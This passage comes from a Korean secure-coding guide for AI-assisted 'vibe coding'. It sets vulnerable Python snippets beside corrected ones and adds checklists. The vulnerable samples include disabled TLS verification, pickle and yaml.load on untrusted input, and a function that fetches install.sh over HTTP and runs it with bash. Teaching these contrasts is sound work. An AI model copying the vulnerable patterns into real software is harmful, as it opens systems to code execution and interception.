SECRET_KEY = os.environ.get('JWT_SECRET_KEY')

def create_token(user_id, role):
    payload = {
        'user_id': user_id,
        'role': role,
        'exp': datetime.now(timezone.utc) + timedelta(hours=1),  # 만료 시간
        'iat': datetime.now(timezone.utc),  # 발급 시간
    }
    # 명시적으로 알고리즘 지정
    return jwt.encode(payload, SECRET_KEY, algorithm='HS256')

def verify_token(token):
    try:
        # 반드시 서명을 검증하고, 허용 알고리즘을 명시적으로 지정
        payload = jwt.decode(
            token,
            SECRET_KEY,
            algorithms=['HS256'],  # 'none'을 절대 포함하지 않음
            options={
                "verify_signature": True,
                "verify_exp": True,      # 만료 시간 검증
                "require": ["exp", "iat", "user_id"]  # 필수 클레임 확인
            }
        )
        return payload
    except jwt.ExpiredSignatureError:
        raise AuthError("토큰이 만료되었습니다.")
    except jwt.InvalidTokenError:
        raise AuthError("유효하지 않은 토큰입니다.")
```

비대칭 키(RSA)를 사용하는 경우에는 공개키와 개인키를 분리하여 사용합니다.

```python
# ✅ RSA 기반 JWT (더 안전한 방식)
import jwt
from cryptography.hazmat.primitives import serialization

# 토큰 생성 (서버의 개인키로 서명)
def create_token_rsa(user_id):
    with open('private_key.pem', 'rb') as f:
        private_key = serialization.load_pem_private_key(f.read(), password=None)

    payload = {
        'user_id': user_id,
        'exp': datetime.now(timezone.utc) + timedelta(hours=1),
    }
    return jwt.encode(payload, private_key, algorithm='RS256')

# 토큰 검증 (공개키로 검증)
def verify_token_rsa(token):
    with open('public_key.pem', 'rb') as f:
        public_key = serialization.load_pem_public_key(f.read())

    return jwt.decode(
        token,
        public_key,
        algorithms=['RS256'],  # RS256만 허용하여 알고리즘 혼동 공격 차단
    )
```

### 바이브 코딩 시 체크포인트

- [ ] `jwt.decode()`에 `verify_signature=False`가 설정되어 있지 않은지 확인합니다.
- [ ] `algorithms` 매개변수에 `"none"`이 포함되어 있지 않은지 확인합니다.
- [ ] JWT 만료 시간(`exp`)이 설정되어 있고 검증되는지 확인합니다.
- [ ] JWT 시크릿 키가 환경 변수로 관리되는지 확인합니다.
- [ ] AI에게 "JWT 서명 검증을 반드시 포함하고, algorithms에는 허용할 알고리즘만 명시해줘"라고 요청합니다.

> **💡 팁:** PyJWT 라이브러리(`pip install pyjwt`)를 사용하십시오. `import jwt`로 사용하되, `pyjwt`와 `jwt`는 다른 패키지이므로 주의하십시오. `pip install pyjwt`가 올바른 패키지입니다.

---

## 10-2. 부적절한 인증서 유효성 검증

### 개요

SSL/TLS 인증서(Certificate)는 HTTPS 통신에서 서버의 신원을 확인하고 데이터를 암호화하는 데 사용됩니다. 파이썬에서 `requests` 라이브러리로 외부 API를 호출할 때, `verify=False`를 설정하면 인증서 검증을 건너뛰게 됩니다.

바이브 코딩에서 AI에게 API 호출 코드를 요청하면, 개발 편의를 위해 `verify=False`를 포함하는 코드를 생성하는 경우가 있습니다. 이는 중간자 공격(MITM, Man-In-The-Middle Attack)에 완전히 노출되는 심각한 보안 취약점입니다.

### 취약한 코드

```python
# ❌ 취약한 코드: SSL 인증서 검증 비활성화
import requests
import urllib3

# 경고 메시지까지 비활성화하는 극히 위험한 코드
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def call_payment_api(payment_data):
    response = requests.post(
        'https://api.payment.com/charge',
        json=payment_data,
        verify=False  # 인증서 검증을 완전히 건너뜀!
    )
    return response.json()
```

### 안전한 코드

```python
# ✅ 안전한 코드: SSL 인증서 검증 활성화
import requests

def call_payment_api(payment_data):
    response = requests.post(
        'https://api.payment.com/charge',
        json=payment_data,
        verify=True  # 기본값이 True이므로 생략 가능
    )
    return response.json()

def call_internal_api(data):
    # 내부 서버에 자체 서명 인증서를 사용하는 경우
    # 해당 CA 인증서 경로를 직접 지정
    response = requests.get(
        'https://internal-api.company.com/data',
        verify='/path/to/company-ca-bundle.crt'
    )
    return response.json()
```

### 바이브 코딩 시 체크포인트

- [ ] 코드 전체에서 `verify=False`를 검색하여 제거합니다.
- [ ] `ssl._create_unverified_context()`가 사용되고 있지 않은지 확인합니다.
- [ ] `urllib3.disable_warnings`로 경고를 숨기고 있지 않은지 확인합니다.
- [ ] 자체 서명 인증서가 필요한 경우 `verify='/path/to/cert.pem'`으로 CA 인증서를 직접 지정합니다.
- [ ] AI에게 "SSL 인증서 검증을 비활성화하지 마"라고 명시합니다.

---

## 10-3. 무결성 검사 없는 코드 다운로드

### 개요

무결성(Integrity)이란 데이터가 변조되지 않았음을 보장하는 것입니다. 외부에서 패키지, 라이브러리, 스크립트를 다운로드하여 사용할 때, 해당 코드가 원본과 동일한지 검증하지 않으면 악성 코드가 포함된 변조된 패키지를 실행할 수 있습니다.

### 취약한 코드

```python
# ❌ 취약한 코드: 검증 없이 외부 스크립트 다운로드 실행
import subprocess
import urllib.request

def install_tool():
    # 인터넷에서 다운로드한 스크립트를 검증 없이 바로 실행
    urllib.request.urlretrieve(
        'http://example.com/install.sh',  # HTTP 사용 (암호화 없음)
        '/tmp/install.sh'
    )
    subprocess.run(['bash', '/tmp/install.sh'])  # 검증 없이 실행
```

### 안전한 코드

해시값을 통해 무결성을 검증하는 ✅ 안전한 코드입니다.

```python
# ✅ 안전한 코드: 다운로드 후 해시 검증
import hashlib
import urllib.request

def download_and_verify(url, expected_hash, save_path):
    # HTTPS를 사용하여 다운로드
    urllib.request.urlretrieve(url, save_path)

    # SHA-256 해시로 무결성 검증
    sha256_hash = hashlib.sha256()
    with open(save_path, 'rb') as f:
        for chunk in iter(lambda: f.read(4096), b''):
            sha256_hash.update(chunk)

    actual_hash = sha256_hash.hexdigest()

    if actual_hash != expected_hash:
        os.remove(save_path)  # 검증 실패 시 파일 삭제
        raise ValueError(
            f"무결성 검증 실패!\n"
            f"예상 해시: {expected_hash}\n"
            f"실제 해시: {actual_hash}"
        )
    return save_path
```

### 바이브 코딩 시 체크포인트

- [ ] AI가 추천하는 패키지 이름의 철자가 정확한지 PyPI에서 직접 확인합니다.
- [ ] `curl ... | bash`와 같은 검증 없는 스크립트 실행을 피합니다.
- [ ] 프로젝트에 `pip-audit` 또는 `safety`를 도입하여 정기적으로 취약점을 점검합니다.
- [ ] `requirements.txt`에 패키지 버전을 고정(`==`)하여 예기치 않은 업데이트를 방지합니다.

> **⚠️ 주의:** AI가 존재하지 않는 패키지 이름을 제안하는 경우가 있습니다(할루시네이션, Hallucination). 공격자는 이 점을 악용하여, AI가 자주 추천하는 가상의 패키지 이름으로 악성 패키지를 등록할 수 있습니다. 반드시 패키지의 실존 여부와 다운로드 수를 확인하십시오.


---

# Chapter 11. 정보 노출을 차단하세요

## 11-1. 쿠키를 통한 정보 노출

### 개요

쿠키(Cookie)는 웹 브라우저에 저장되는 작은 데이터로, 로그인 상태 유지, 사용자 설정 저장 등에 사용됩니다. 그러나 쿠키의 보안 속성(Security Flag)을 적절히 설정하지 않으면, 세션 ID나 인증 토큰과 같은 중요 정보가 공격자에게 노출될 수 있습니다.

### 취약한 코드

```python
# ❌ 취약한 코드 (Django): 쿠키 보안 속성 미설정
from django.http import HttpResponse

def login_view(request):
    user = authenticate(request)
    if user:
        response = HttpResponse("로그인 성공")
        # 보안 속성 없이 세션 ID를 쿠키에 저장
        response.set_cookie('session_id', generate_session_id())
        return response
```

### 안전한 코드

```python
# ✅ 안전한 코드 (Django): 쿠키 보안 속성 설정
from django.http import HttpResponse

def login_view(request):
    user = authenticate(request)
    if user:
        response = HttpResponse("로그인 성공")
        response.set_cookie(
            'session_id',
            generate_session_id(),
            httponly=True,    # JavaScript에서 접근 불가
            secure=True,      # HTTPS에서만 전송
            samesite='Lax',   # 외부 사이트에서의 요청 시 쿠키 미전송
            max_age=3600,     # 1시간 후 만료
            path='/',
        )
        return response
```

Django 프로젝트에서는 `settings.py`에서 전역적으로 세션 쿠키의 보안 속성을 설정할 수 있습니다.

```python
# ✅ Django settings.py에서 세션 쿠키 보안 설정
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_SAMESITE = 'Lax'
CSRF_COOKIE_HTTPONLY = True
CSRF_COOKIE_SECURE = True
CSRF_COOKIE_SAMESITE = 'Lax'
SESSION_COOKIE_AGE = 3600
SESSION_EXPIRE_AT_BROWSER_CLOSE = True
```

| 속성 | 역할 | 미설정 시 위험 |
|---|---|---|
| `HttpOnly` | JavaScript에서 쿠키 접근 차단 | XSS를 통한 세션 탈취 |
| `Secure` | HTTPS 연결에서만 쿠키 전송 | 네트워크 도청으로 쿠키 유출 |
| `SameSite` | 외부 사이트 요청 시 쿠키 전송 제한 | CSRF 공격 |

### 바이브 코딩 시 체크포인트

- [ ] `set_cookie()` 호출 시 `httponly=True`, `secure=True`, `samesite='Lax'`가 모두 설정되어 있는지 확인합니다.
- [ ] Django 프로젝트의 `settings.py`에서 `SESSION_COOKIE_HTTPONLY`, `SESSION_COOKIE_SECURE`, `SESSION_COOKIE_SAMESITE`를 설정합니다.
- [ ] 쿠키에 `max_age` 또는 만료 시간을 설정하여 영구 쿠키를 방지합니다.
- [ ] 쿠키에 패스워드, 개인정보 등 민감한 정보를 직접 저장하지 않습니다.

---

## 11-2. 주석문 안에 포함된 시스템 주요정보

### 개요

주석(Comment)은 코드의 동작을 설명하기 위해 작성하는 텍스트로, 프로그램 실행에는 영향을 주지 않습니다. 그러나 주석에 패스워드, API 키, 서버 주소, 데이터베이스 접속 정보 등의 중요정보가 포함되어 있으면, 소스코드에 접근한 누구나 이 정보를 확인할 수 있습니다.

**이 문제는 바이브 코딩에서 특히 심각합니다.** AI 코드 생성 도구는 코드를 설명하기 위해 자동으로 주석을 생성하는데, 이 과정에서 중요정보가 주석에 포함될 수 있습니다.

### 취약한 코드

```python
# ❌ 취약한 코드: 주석에 중요정보 포함
import pymysql

# DB 접속 정보: admin / P@ssw0rd123!
# 서버: 192.168.1.100:3306
def get_connection():
    # TODO: 나중에 환경 변수로 변경하기
    # 현재 테스트용 키: sk-proj-abc123xyz456
    return pymysql.connect(
        host=os.environ.get('DB_HOST'),
        user=os.environ.get('DB_USER'),
        passwd=os.environ.get('DB_PASSWORD'),
    )
```

### 안전한 코드

```python
# ✅ 안전한 코드: 주석에 중요정보를 포함하지 않음
import pymysql
import os

def get_connection():
    """환경 변수에서 DB 접속 정보를 가져와 연결을 생성합니다."""
    return pymysql.connect(
        host=os.environ.get('DB_HOST'),
        user=os.environ.get('DB_USER'),
        passwd=os.environ.get('DB_PASSWORD'),
        db=os.environ.get('DB_NAME'),
        charset='utf8',
    )
```

### 바이브 코딩 시 체크포인트

- [ ] AI가 생성한 코드의 모든 주석을 검토하여 패스워드, API 키, 서버 주소, 접속 정보가 포함되어 있지 않은지 확인합니다.
- [ ] HTML과 JavaScript 파일의 주석에 시스템 내부 정보가 노출되어 있지 않은지 확인합니다.
- [ ] `TODO: 나중에 변경`, `임시 패스워드` 등의 주석이 운영 코드에 남아 있지 않은지 확인합니다.
- [ ] `detect-secrets` 또는 유사한 도구를 Pre-commit Hook으로 설정하여 커밋 전에 자동으로 검사합니다.
- [ ] AI에게 프롬프트를 전달할 때, 실제 API 키나 패스워드 대신 `YOUR_API_KEY_HERE`와 같은 플레이스홀더(Placeholder)를 사용합니다.

> **⚠️ 주의:** AI에게 "이 API 키로 OpenAI를 호출하는 코드를 만들어줘"라고 실제 키를 프롬프트에 포함하면, AI가 그 키를 주석에 포함할 가능성이 높습니다. 프롬프트에는 절대로 실제 중요정보를 포함하지 마십시오.


---

# PART 4. 안정적인 코드를 작성하세요

# Chapter 12. 시간 및 상태 — 타이밍이 만드는 버그

여러 작업이 동시에 실행되는 환경에서는 "언제" 코드가 실행되는지가 "무엇을" 실행하는지만큼 중요합니다. AI가 생성한 코드는 단일 스레드 환경에서는 잘 동작하지만, 실제 서버 환경에서 동시에 여러 요청이 들어올 때 예상치 못한 충돌을 일으킬 수 있습니다. 이 장에서는 시간과 상태(Time and State) 관련 보안약점을 살펴봅니다.

---

## 12-1. 경쟁 조건: 검사 시점과 사용 시점(TOCTOU)

### 개요

경쟁 조건(Race Condition)이란 두 개 이상의 프로세스나 스레드가 공유 자원에 동시에 접근할 때 실행 순서에 따라 결과가 달라지는 현상을 말합니다. 그중에서도 **TOCTOU(Time Of Check, Time Of Use)** 는 자원의 상태를 검사하는 시점(Check)과 실제로 사용하는 시점(Use) 사이의 시간 차이를 악용하는 대표적인 보안약점입니다.

### ❌ 취약한 코드

```python
import os
import threading

def write_shared_file(filename, content):
    # 파일 존재 여부를 먼저 검사(TOC)
    if os.path.isfile(filename):
        # 검사와 사용 사이에 다른 스레드가 파일을 삭제할 수 있음
        f = open(filename, 'w')  # 사용 시점(TOU)
        f.write(content)
        f.close()

def start():
    filename = './temp.txt'
    content = "user data"
    t = threading.Thread(target=write_shared_file, args=(filename, content))
    t.start()
```

### ✅ 안전한 코드

```python
import os
import threading

lock = threading.Lock()

def write_shared_file(filename, content):
    # Lock을 사용해 한 번에 하나의 스레드만 접근하도록 보호
    with lock:
        if os.path.isfile(filename):
            f = open(filename, 'w')
            f.write(content)
            f.close()

def start():
    filename = './temp.txt'
    content = "user data"
    t = threading.Thread(target=write_shared_file, args=(filename, content))
    t.start()
```

> **💡 팁:** 웹 프레임워크에서 파일을 다룰 때는 데이터베이스 레코드와 함께 트랜잭션(Transaction)으로 묶거나, 고유한 파일명(UUID 기반)을 생성하여 충돌 자체를 원천적으로 방지하는 것이 더 실용적입니다.

---

## 12-2. 종료되지 않는 반복문 또는 재귀 함수

### 개요

재귀 함수(Recursive Function)는 자기 자신을 호출하는 함수입니다. 종료 조건인 기본 케이스(Base Case)가 없거나 잘못 정의되면 함수가 무한히 자신을 호출하게 됩니다. 이는 서버의 메모리와 CPU를 고갈시켜 서비스 거부(DoS) 상태를 유발합니다.

### ❌ 취약한 코드

```python
import sys

# AI가 "재귀 제한 에러를 해결해줘"라는 요청에 생성할 수 있는 위험한 코드
sys.setrecursionlimit(100000)

def factorial(num):
    # 기본 케이스(Base Case)가 없어 무한 재귀 발생
    return num * factorial(num - 1)

result = factorial(5)
```

### ✅ 안전한 코드

```python
def factorial(num):
    # 명확한 기본 케이스 정의
    if num <= 0:
        return 1
    return num * factorial(num - 1)

result = factorial(5)
print(f"5 팩토리얼 값은: {result}")  # 출력: 120
```

> **⚠️ 주의:** AI가 `RecursionError`를 해결하기 위해 `sys.setrecursionlimit()`을 제안하면 주의해야 합니다. 이는 근본적인 해결이 아니라 시한폭탄의 타이머를 늘리는 것과 같습니다.

### 바이브 코딩 시 체크포인트

| 점검 항목 | 확인 방법 |
|-----------|-----------|
| 공유 자원에 Lock 사용 여부 | 파일, 전역 변수 접근 시 `threading.Lock()` 또는 데이터베이스 트랜잭션 사용 확인 |
| 파일명 충돌 방지 | 사용자 업로드 파일에 UUID 기반 고유 파일명 사용 여부 확인 |
| 재귀 함수의 기본 케이스 | 모든 재귀 함수에 명확한 종료 조건이 있는지 확인 |
| `setrecursionlimit` 사용 여부 | 코드베이스에서 해당 함수 호출을 검색하여 불필요한 사용 제거 |
| 반복문 탈출 조건 | `while True` 패턴 사용 시 `break` 조건이 반드시 도달 가능한지 확인 |
| 재귀 대신 반복문 검토 | 깊은 재귀가 예상되는 경우 반복문이나 내장 함수로 대체 가능한지 검토 |


---

# Chapter 13. 에러 처리 — 오류가 보안 구멍이 되는 순간

프로그램에 오류가 발생하는 것은 자연스러운 일입니다. 문제는 그 오류를 어떻게 처리하느냐에 있습니다. 오류 메시지에 시스템 내부 정보가 담겨 외부에 노출되거나, 오류를 아예 무시해버리면 공격자에게 침투 경로를 열어주는 결과를 초래합니다.

---

## 13-1. 오류 메시지 정보 노출

### ❌ 취약한 코드

```python
# AI가 생성한 기본 설정 — 배포 시 반드시 변경 필요
DEBUG = True
ALLOWED_HOSTS = ['*']
```

### ✅ 안전한 코드

```python
import os

DEBUG = False
ALLOWED_HOSTS = [os.environ.get('ALLOWED_HOST', 'localhost')]
```

```python
import logging

logger = logging.getLogger(__name__)

def fetch_url(url):
    try:
        response = requests.get(url, timeout=5)
        return response.text
    except IOError:
        # 내부 로그에만 기록하고 사용자에게는 최소 정보만 전달
        logger.error("외부 URL 통신 에러 발생", exc_info=True)
        return "일시적인 오류가 발생했습니다. 잠시 후 다시 시도해주세요."
```

---

## 13-2. 오류 상황 대응 부재

### ❌ 취약한 코드

```python
from Crypto.Cipher import AES

static_keys = [
    {'key': b'secure_key_00001', 'iv': b'secure_iv_000001'},
    {'key': b'secure_key_00002', 'iv': b'secure_iv_000002'},
]

def encryption(key_id, plain_text):
    static_key = {'key': b'0000000000000000', 'iv': b'0000000000000000'}
    try:
        static_key = static_keys[key_id]
    except IndexError:
        # 오류를 무시하고 취약한 기본 키로 암호화 진행
        pass

    cipher = AES.new(static_key['key'], AES.MODE_CBC, static_key['iv'])
```

### ✅ 안전한 코드

```python
import secrets
import logging
from Crypto.Cipher import AES

logger = logging.getLogger(__name__)

def encryption(key_id, plain_text):
    try:
        static_key = static_keys[key_id]
    except IndexError:
        logger.warning(f"유효하지 않은 key_id: {key_id}, 랜덤 키 생성")
        static_key = {'key': secrets.token_bytes(16), 'iv': secrets.token_bytes(16)}

    cipher = AES.new(static_key['key'], AES.MODE_CBC, static_key['iv'])
```

---

## 13-3. 부적절한 예외 처리

### ❌ 취약한 코드

```python
def get_content():
    try:
        f = open('myfile.txt')
        s = f.readline()
        i = int(s.strip())
    except:
        print("Unexpected error")
```

### ✅ 안전한 코드

```python
import logging

logger = logging.getLogger(__name__)

def get_content():
    try:
        f = open('myfile.txt')
        s = f.readline()
        i = int(s.strip())
        return i
    except FileNotFoundError:
        logger.error("설정 파일을 찾을 수 없습니다.")
        return None
    except PermissionError:
        logger.error("설정 파일에 대한 읽기 권한이 없습니다.")
        return None
    except ValueError:
        logger.error("설정 파일의 데이터 형식이 올바르지 않습니다.")
        return None
    finally:
        try:
            f.close()
        except NameError:
            pass
```

> **⚠️ 주의:** `except Exception as e: pass` 패턴을 AI가 생성하면 반드시 수정해야 합니다.

### 바이브 코딩 시 체크포인트

| 점검 항목 | 확인 방법 |
|-----------|-----------|
| `DEBUG = True` 설정 여부 | Django `settings.py`, Flask `app.run()` 인자 확인 |
| `traceback.print_exc()` 사용 여부 | 코드 전체에서 `traceback` 모듈 사용 검색 |
| 사용자 정의 에러 페이지 | Django `handler404`, `handler500` 등 설정 여부 확인 |
| 빈 `except` 블록 | `except:` 뒤에 `pass`만 있는 코드 검색 |
| 광범위한 예외 처리 | `except Exception:` 사용 시 예외 종류를 세분화할 수 있는지 검토 |
| 로깅 설정 | `print()` 대신 `logging` 모듈을 사용하고 있는지 확인 |
| 에러 응답에 내부 정보 포함 여부 | API 응답이나 HTML에 스택 트레이스, 파일 경로가 포함되지 않는지 확인 |


---

# Chapter 14. 코드 오류 — 개발자가 놓치기 쉬운 함정들

완벽해 보이는 코드에도 미묘한 오류가 숨어 있을 수 있습니다. 변수가 `None`인지 확인하지 않거나, 파일이나 데이터베이스 연결을 제대로 닫지 않거나, 외부에서 전달된 데이터를 검증 없이 역직렬화하는 것은 모두 심각한 보안 사고로 이어질 수 있는 코드 오류입니다.

---

## 14-1. Null Pointer 역참조

### ❌ 취약한 코드

```python
from django.shortcuts import render

def parse_input(request):
    username = request.POST.get('username')
    # username이 None일 경우 AttributeError 발생
    if username.strip() == "":
        return render(request, '/error.html', {'error': '이름을 입력하세요.'})
    return render(request, '/success.html', {'name': username})
```

### ✅ 안전한 코드

```python
from django.shortcuts import render

def parse_input(request):
    username = request.POST.get('username')
    if username is None or username.strip() == "":
        return render(request, '/error.html', {'error': '이름을 입력하세요.'})
    username = username.strip()
    return render(request, '/success.html', {'name': username})
```

> **💡 팁:** `request.POST.get('field', '')`처럼 기본값을 빈 문자열로 지정하면 `None` 반환을 원천적으로 방지할 수 있습니다.

---

## 14-2. 부적절한 자원 해제

### ❌ 취약한 코드

```python
def get_config():
    lines = None
    try:
        f = open('config.cfg')
        lines = f.readlines()
        process_data(lines)
        f.close()  # 예외 발생 시 도달 불가
        return lines
    except Exception as e:
        return ''
```

### ✅ 안전한 코드

```python
def get_config():
    try:
        with open('config.cfg') as f:
            lines = f.readlines()
            process_data(lines)
            return lines
    except FileNotFoundError:
        logging.error("설정 파일을 찾을 수 없습니다.")
        return ''
    except Exception as e:
        logging.error(f"설정 파일 처리 중 오류: {e}")
        return ''
```

> **💡 팁:** 파이썬의 `with` 문(컨텍스트 매니저)은 자원 해제를 자동으로 보장합니다. 파일, 데이터베이스 연결, 네트워크 소켓 등 `close()`가 필요한 모든 자원에 `with` 문을 사용하는 것을 습관으로 만드십시오.

---

## 14-3. 신뢰할 수 없는 데이터의 역직렬화

### ❌ 취약한 코드

```python
import pickle
from django.shortcuts import render

def load_user_object(request):
    user_data = request.POST.get('userinfo', '')
    user_obj = pickle.loads(user_data.encode())
    return render(request, '/profile.html', {'user': user_obj})
```

### ✅ 안전한 코드

```python
import json
from django.shortcuts import render

def load_user_object(request):
    try:
        user_data = request.POST.get('userinfo', '{}')
        user_obj = json.loads(user_data)
        return render(request, '/profile.html', {'user': user_obj})
    except json.JSONDecodeError:
        return render(request, '/error.html', {'error': '잘못된 데이터 형식입니다.'})
```

> **⚠️ 주의:** 파이썬 공식 문서에도 명시되어 있듯이, `pickle` 모듈은 **신뢰할 수 없는 데이터에 대해 안전하지 않습니다**. 외부 입력 데이터에는 반드시 `json.loads()`를 사용하십시오.

### 바이브 코딩 시 체크포인트

| 점검 항목 | 확인 방법 |
|-----------|-----------|
| `None` 체크 누락 | `request.POST.get()` 반환값 사용 전 `is None` 검사 여부 |
| `with` 문 사용 | 파일, DB 연결, 소켓 등에 `with` 문 사용 여부 확인 |
| `pickle.loads()` 사용 | 코드베이스에서 `pickle` 모듈 사용 검색, 외부 데이터 역직렬화 여부 확인 |
| JSON 대체 가능성 | `pickle` 대신 `json` 모듈로 대체할 수 있는지 검토 |

---

# PART 5. 구조와 설계로 지키세요

# Chapter 15. 캡슐화 — 보여서는 안 되는 것들

캡슐화(Encapsulation)란 데이터와 기능을 적절히 감싸서 외부에 불필요하게 노출되지 않도록 하는 설계 원칙입니다.

---

## 15-1. 잘못된 세션에 의한 데이터 정보 노출

### ❌ 취약한 코드

```python
from django.shortcuts import render

class UserDescription:
    # 클래스 변수 — 모든 인스턴스와 스레드가 공유
    user_name = ''

    def show_user_profile(self, request):
        UserDescription.user_name = request.POST.get('name', '')
        self.user_profile = self.get_user_profile()
        return render(request, 'profile.html', {'profile': self.user_profile})
```

### ✅ 안전한 코드

```python
from django.shortcuts import render

# 함수 기반 뷰 — 각 요청이 독립적인 지역 변수를 사용
def show_user_profile(request):
    user_name = request.POST.get('name', '')
    profile = get_user_description(user_name)
    return render(request, 'profile.html', {'profile': profile})
```

> **💡 팁:** Django에서는 클래스 기반 뷰(CBV)보다 함수 기반 뷰(FBV)가 스레드 안전성 측면에서 더 직관적입니다.

---

## 15-2. 제거되지 않고 남은 디버그 코드

### ❌ 취약한 코드

```python
# settings.py
DEBUG = True
```

```python
def login(request):
    username = request.POST.get('username')
    password = request.POST.get('password')
    # 디버그용 출력 — 비밀번호가 서버 로그에 기록됨
    print(f"[DEBUG] 로그인 시도: {username} / {password}")
    ...
```

### ✅ 안전한 코드

```python
# settings.py
import os
DEBUG = False
ALLOWED_HOSTS = [os.environ.get('ALLOWED_HOST', 'localhost')]
```

```python
import logging
logger = logging.getLogger(__name__)

def login(request):
    username = request.POST.get('username')
    password = request.POST.get('password')
    # 로그에 비밀번호를 절대 포함하지 않음
    logger.info(f"로그인 시도: {username}")
    ...
```

> **⚠️ 주의:** 배포 전 다음 키워드로 코드베이스를 반드시 검색하십시오: `print(`, `console.log(`, `DEBUG = True`, `debug=True`, `/debug`, `/test`, `TODO`, `FIXME`, `HACK`.

### 바이브 코딩 시 체크포인트

| 점검 항목 | 확인 방법 |
|-----------|-----------|
| 클래스 변수에 사용자 데이터 저장 여부 | 클래스 정의에서 사용자별 데이터가 클래스 변수로 선언되어 있는지 확인 |
| `print()` 문 잔존 여부 | 코드베이스 전체에서 `print(` 검색 |
| `console.log()` 잔존 여부 | JavaScript 파일에서 `console.log(` 검색 |
| `DEBUG = True` 설정 | `settings.py`와 `app.run()` 인자 확인 |
| 디버그 엔드포인트 | URL 라우팅에서 `/debug`, `/test` 등 테스트용 경로 확인 |
| 하드코딩된 테스트 계정 | 코드에서 `test@`, `admin/admin`, `password123` 등 검색 |


---

# Chapter 16. API 오용 — 편리함 뒤에 숨은 위험

## 16-1. 취약한 API 사용

### ❌ 취약한 코드

```python
import yaml

def load_config(config_path):
    with open(config_path) as f:
        # yaml.load()는 임의 코드 실행 가능 — 절대 사용 금지
        config = yaml.load(f)
    return config
```

### ✅ 안전한 코드

```python
import yaml

def load_config(config_path):
    with open(config_path) as f:
        # safe_load()는 기본 데이터 타입만 허용
        config = yaml.safe_load(f)
    return config
```

### 안전한 패키지 선택 기준

1. **사용 통계**: PyPI 통계나 GitHub 스타(Star) 수를 참고합니다.
2. **이슈 관리**: 버그 리포트와 보안 이슈가 적시에 처리되고 있는지 확인합니다.
3. **마지막 업데이트**: 최근 6개월 이내에 업데이트가 있었는지 확인합니다.
4. **알려진 취약점**: NIST NVD 또는 CVEdetails에서 패키지명으로 검색합니다.

```bash
# pip-audit: 설치된 패키지의 알려진 취약점 검사
pip install pip-audit
pip-audit

# safety: requirements.txt 기반 취약점 검사
pip install safety
safety check -r requirements.txt
```

> **💡 팁:** CI/CD 파이프라인에 `pip-audit`이나 `safety check`를 포함시키면, 취약한 패키지가 포함된 코드가 배포되기 전에 자동으로 차단할 수 있습니다.

### 바이브 코딩 시 체크포인트

| 점검 항목 | 확인 방법 |
|-----------|-----------|
| `yaml.load()` 사용 여부 | `yaml.safe_load()`로 대체 |
| `eval()`, `exec()` 사용 여부 | `ast.literal_eval()` 또는 안전한 대안으로 대체 |
| `md5`, `sha1` 해시 사용 | 비밀번호에는 `bcrypt` 또는 `argon2` 사용 |
| `pickle.loads()` 외부 데이터 처리 | `json.loads()`로 대체 |
| 패키지 버전 고정 | `requirements.txt`에 최소 버전 명시 |
| 패키지 취약점 검사 | `pip-audit` 또는 `safety check` 실행 |

---

# PART 6. 바이브 코딩 보안 체크리스트

# Chapter 17

---

## 17-1. 배포 전 보안 체크리스트

### 바이브 코딩 배포 전 보안 체크 플로우차트

```
┌─────────────────────────────────────────────────────────────────────┐
│              바이브 코딩 배포 전 보안 체크 플로우차트               │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ┌─────────────────────────┐                                        │
│  │ ① AI로 코드 생성 완료  │                                        │
│  └────────────┬────────────┘                                        │
│               │                                                     │
│               ▼                                                     │
│  ┌─────────────────────────────────────┐       ┌──────────────────┐ │
│  │ ② .env 파일에 시크릿 분리했는가?   │─ No ─▶│ 수정 필요        │ │
│  │    (API키, DB비번, 토큰 등)        │       │ 하드코딩된 시크릿│ │
│  └──────────────┬──────────────────────┘       │ .env로 분리      │ │
│            Yes  │                              └──────────────────┘ │
│                 ▼                                                    │
│  ┌─────────────────────────────────────┐       ┌──────────────────┐ │
│  │ ③ 입력값 검증이 있는가?            │─ No ─▶│ 수정 필요        │ │
│  │    (SQL, XSS, 경로 조작 방어)      │       │ 모든 사용자 입력 │ │
│  └──────────────┬──────────────────────┘       │ 검증 로직 추가   │ │
│            Yes  │                              └──────────────────┘ │
│                 ▼                                                    │
│  ┌─────────────────────────────────────┐       ┌──────────────────┐ │
│  │ ④ 인증/인가가 적용되었는가?        │─ No ─▶│ 수정 필요        │ │
│  │    (로그인 + 권한 확인)            │       │ 인증/인가 미들웨 │ │
│  └──────────────┬──────────────────────┘       │ 어 적용          │ │
│            Yes  │                              └──────────────────┘ │
│                 ▼                                                    │
│  ┌─────────────────────────────────────┐       ┌──────────────────┐ │
│  │ ⑤ DEBUG=False 설정했는가?          │─ No ─▶│ 수정 필요        │ │
│  │    (프로덕션 환경 설정)            │       │ DEBUG=False 설정 │ │
│  └──────────────┬──────────────────────┘       │ 환경변수 분리    │ │
│            Yes  │                              └──────────────────┘ │
│                 ▼                                                    │
│  ┌─────────────────────────────────────┐       ┌──────────────────┐ │
│  │ ⑥ 에러 메시지에 민감정보 없는가?   │─ No ─▶│ 수정 필요        │ │
│  │    (스택트레이스, DB정보 노출)      │       │ 사용자에게 일반  │ │
│  └──────────────┬──────────────────────┘       │ 에러 메시지 반환 │ │
│            Yes  │                              └──────────────────┘ │
│                 ▼                                                    │
│  ┌─────────────────────────────────────┐       ┌──────────────────┐ │
│  │ ⑦ 보안 헤더 설정했는가?            │─ No ─▶│ 수정 필요        │ │
│  │    (CSP, HSTS, X-Frame 등)         │       │ 보안 헤더 미들웨 │ │
│  └──────────────┬──────────────────────┘       │ 어 추가          │ │
│            Yes  │                              └──────────────────┘ │
│                 ▼                                                    │
│  ┌─────────────────────────────────────┐                            │
│  │  ✅ 배포 준비 완료!                │                            │
│  │     모든 보안 체크 통과            │                            │
│  └─────────────────────────────────────┘                            │
│                                                                     │
│  각 단계에서 "No"가 나오면 수정 후 ①부터 다시 시작!                │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 개요

여러분이 바이브 코딩으로 만든 웹사이트를 세상에 공개하기 전, 반드시 점검해야 할 보안 항목을 정리하였습니다.

### 인증/인가(Authentication/Authorization) 체크리스트

- [ ] 비밀번호는 bcrypt, scrypt, Argon2 등의 해시 알고리즘으로 저장하고 있습니까?
- [ ] 비밀번호를 평문으로 저장하거나 MD5/SHA1으로만 해싱하고 있지 않습니까?
- [ ] 로그인 실패 시 구체적인 정보를 노출하지 않습니까?
- [ ] 로그인 시도 횟수 제한(Rate Limiting)이 적용되어 있습니까?
